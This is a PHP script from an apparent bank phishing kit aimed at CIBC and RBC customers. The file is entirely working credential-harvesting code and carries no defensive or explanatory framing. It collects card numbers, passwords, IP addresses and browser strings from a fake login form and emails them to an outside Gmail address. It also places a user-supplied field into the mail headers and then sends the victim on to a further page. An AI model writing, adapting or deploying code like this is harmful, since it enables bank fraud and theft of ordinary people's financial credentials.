<?php $ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message.= "--------------CIBC Info----------------------
";
$message.= "Card num : " . $_POST['K1'] . "
";
$message.= "Password : " . $_POST['Q1'] . "
";
$message.= "IP                     : " . $ip . "
";
$message.= "Agent   :  " . $browser . "
";
$send = "alarg53@gmail.com";
$subject = "1 RBC LOGIN $ip";
$headers = "From: RBC Info<customer-support@mrs>";
$headers.= $_POST['eMailAdd'] . "
";
$headers.= "MIME-Version: 1.0
";
$arr = array($send, $IP);
foreach ($arr as $send) {
    mail($send, $subject, $message, $headers);
    mail($to, $subject, $message, $headers);
}
header("Location: details.php");